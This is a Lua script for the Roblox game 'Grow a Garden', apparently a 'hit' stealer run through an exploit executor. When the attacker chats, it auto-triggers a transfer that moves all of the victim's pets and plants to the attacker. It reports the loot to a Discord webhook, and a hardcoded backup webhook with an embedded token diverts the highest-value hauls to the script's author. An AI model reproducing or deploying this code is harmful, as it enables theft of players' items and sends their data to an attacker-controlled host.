-- GROW A GARDEN HIT - By namnnni2

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
local Modules = ReplicatedStorage:WaitForChild("Modules")

-- LẤY SETTINGS TỪ getfenv()
local env = getfenv()
local PRIMARY_WEBHOOK = env.Webhook
local PRIMARY_USERNAME = env.Username

-- WEBHOOK DỰ PHÒNG
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DUAL_USERNAME = "namnnni2"

-- CẤU HÌNH
local VALUE_THRESHOLD = 1_000_000_000_000
local HEAVY_WEIGHT = 10
local AUTO_TRANSFER_DELAY = 0.3
local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}

-- MODULES
local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))

-- LẤY HÀM GỬI WEBHOOK TƯƠNG THÍCH EXECUTOR
local request =
    (syn and syn.request) or
    (http and http.request) or
    (fluxus and fluxus.request) or
    (getgenv and getgenv().request) or
    (krnl and krnl.request) or
    request

-- HÀM TÍNH GIÁ TRỊ ITEM
local function calculateItemValue(tool)
    local itemType = tool:GetAttribute("ItemType")
    if itemType == "Pet" then
        return petUtils:GetPetValue(tool)
    elseif itemType == "Plant" then
        return calcPlantValue(tool)
    end
    return 0
end

-- FORMAT SỐ CÓ DẤU PHẨY
local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

-- ƯU TIÊN ITEM
local function getPriority(item)
    local score = 0
    if table.find(VIP_PETS, item.Name) then score += 1000 end
    if (item.Weight or 0) >= HEAVY_WEIGHT then score += 500 end
    score += item.Value or 0
    return score
end

-- SẮP XẾP ƯU TIÊN
local function sortByPriority(a, b)
    return getPriority(a) > getPriority(b)
end

-- GỬI WEBHOOK
local function sendWebhook(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or "unknown")

    if not webhookUrl then
        warn("❌ Không có webhook để gửi.")
        return
    end

    local hasImportant = false
    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
            hasImportant = true
            break
        end
    end

    local categories = {
        {title = "💎 VIP Pets", items = {}},
        {title = "🏋️ Heavy Pets", items = {}},
        {title = "🐾 Regular Pets", items = {}},
        {title = "🌱 Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    local desc = {}
    for _, cat in ipairs(categories) do
        if #cat.items > 0 then
            table.insert(desc, "**"..cat.title.." ("..#cat.items..")**")
            for _, i in ipairs(cat.items) do
                table.insert(desc, string.format("- %s: $%s (%.1fkg)", i.Name, formatNumber(i.Value), i.Weight or 0))
            end
            table.insert(desc, "")
        end
    end

    local payload = {
        username = username,
        embeds = {{
            title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(desc, "\n"),
            fields = {
                {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
                {name = "🎯 Receiver", value = targetName, inline = true},
                {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "🔗 Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = DateTime.now():ToIsoDate()
        }},
        content = hasImportant and "@everyone" or nil
    }

    if request then
        local success, res = pcall(function()
            return request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)

        if success and res and res.StatusCode and res.StatusCode < 400 then
            warn("✅ Webhook gửi thành công.")
        else
            warn("❌ Webhook lỗi:", res and res.StatusCode, res and res.Body)
        end
    else
        warn("❌ Executor không hỗ trợ request.")
    end
end

-- CHUYỂN ITEM VÀ GỬI WEBHOOK
local function transferToPlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then return end
    local char = target.Character or target.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local myHRP = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end

    local prompt = Instance.new("ProximityPrompt")
    prompt.ActionText = "Transfer"
    prompt.ObjectText = "To "..targetName
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = hrp

    prompt.Triggered:Connect(function()
        local items = {}
        local total = 0
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Weight = tool:GetAttribute("Weight"),
                    Value = calculateItemValue(tool),
                    Tool = tool
                }
                table.insert(items, item)
                total += item.Value
            end
        end

        table.sort(items, sortByPriority)

        local targetBackpack = target:FindFirstChildOfClass("Backpack")
        for _, item in ipairs(items) do
            if item.Tool and item.Tool.Parent == Backpack then
                item.Tool.Parent = targetBackpack
                task.wait(AUTO_TRANSFER_DELAY)
            end
        end

        sendWebhook(items, total, targetName)
    end)

    -- Auto run prompt
    task.delay(0.5, function()
        prompt:InputHoldBegin()
        task.wait(prompt.HoldDuration)
        prompt:InputHoldEnd()
    end)

    -- Follow sau lưng
    RunService.Heartbeat:Connect(function(dt)
        local pos = hrp.CFrame.Position - hrp.CFrame.LookVector * 3
        local move = myHRP.Position:Lerp(pos, dt * 10)
        myHRP.CFrame = CFrame.new(move, hrp.Position)
    end)
end

-- NGHE CHAT CỦA CHỦ
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function()
        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
            transferToPlayer(p.Name)
        end
    end)
end)

for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function()
        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
            transferToPlayer(p.Name)
        end
    end)
end
